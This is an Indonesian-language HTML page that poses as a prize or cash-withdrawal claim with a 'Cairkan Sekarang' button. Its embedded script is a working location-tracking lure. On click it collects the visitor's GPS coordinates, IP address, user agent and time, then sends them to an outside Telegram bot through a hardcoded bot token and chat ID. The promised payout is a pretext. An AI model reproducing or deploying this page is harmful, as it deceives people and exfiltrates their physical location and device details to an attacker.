
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Penarikan Tunai | CYBER FLAY</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #000;
      color: white;
      text-align: center;
      padding-top: 40px;
    }
    img {
      width: 80%;
      max-width: 400px;
      border-radius: 12px;
      margin-bottom: 20px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #ff6600;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    h2 {
      color: #00ffcc;
    }
  </style>
</head>
<body>
  <img src="tashanwin.jpg" alt="Bonus Menang">
  <h2>Selamat Datang!</h2>
  <p>Untuk mencairkan hadiah Anda, silakan klik tombol di bawah dan izinkan lokasi.</p>
  <button onclick="mulaiPelacakan()">Cairkan Sekarang</button>

  <script>
    async function getIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch (e) {
        return "IP tidak ditemukan";
      }
    }

    function getUserAgent() {
      return navigator.userAgent;
    }

    function getTime() {
      return new Date().toLocaleString();
    }

    function kirimTelegram(pesan) {
      const token = "8069601328:AAFiHiIqe5ICmG6t4pIaal10JjNIM7QN7RM";
      const chat_id = "7932600874";
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chat_id, text: pesan })
      });
    }

    function mulaiPelacakan() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async function(pos) {
          const ip = await getIP();
          const userAgent = getUserAgent();
          const time = getTime();
          const latitude = pos.coords.latitude;
          const longitude = pos.coords.longitude;

          const pesan = `üì± IP: ${ip}\nüìç Lokasi: https://maps.google.com/?q=${latitude},${longitude}\nüïí Waktu: ${time}\nüß† Agen: ${userAgent}`;

          kirimTelegram(pesan);
          alert("Sedang diproses, mohon tunggu...");
        }, function(error) {
          alert("Gagal mengambil lokasi: " + error.message);
        });
      } else {
        alert("Perangkat tidak mendukung pelacakan lokasi.");
      }
    }
  </script>
</body>
</html>
